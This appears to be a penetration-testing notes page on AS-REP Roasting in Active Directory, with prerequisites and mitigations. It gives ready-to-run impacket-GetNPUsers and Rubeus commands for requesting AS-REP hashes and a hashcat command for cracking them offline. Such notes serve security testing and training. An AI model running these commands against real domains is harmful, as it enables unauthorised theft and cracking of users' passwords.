---
layout: default
title: AS-REP Roasting
parent: Active Directory
nav_order: 1
permalink: /ad/asreproasting/
---

# AS-REP Roasting
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Prerequisites

- Low privileged domain account.
- Target must be a domain user with “*Do not require Kerberos preauthentication*” enabled.

## Exploit

If domain contains accounts vulnerable to AS-REP roasting, request the AS-REP for concerned domain users on a targeted domain controller with `Rubeus` or `impacket-GetNPUsers`.

```bash
# From Kali.
impacket-GetNPUsers -dc-ip $DC_IP -request -outputfile hashes.asreproast $DOMAIN/$USERNAME:$PASSWORD

# From a domain joined computer.
.\Rubeus.exe asreproast /outfile:hashes.asreproast /nowrap

# From a Windows computer not joined to the domain.
.\Rubeus.exe asreproast /creduser:$DOMAIN\$USERNAME /credpassword:$PASSWORD /domain:$DOMAIN /dc:$DC_IP /outfile:hashes.asreproast /nowrap
```

Then, crack the AS-REP hash. You can use `hashcat` to do that.

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Recommendations

- [ ]  Disable “*Do not require Kerberos preauthentication*” for domain users when it’s technically possible.
- [ ]  If disabling “*Do not require Kerberos preauthentication*” isn’t technically possible, enforce strong password for involved domain users so it makes it hard - even impossible - to crack them.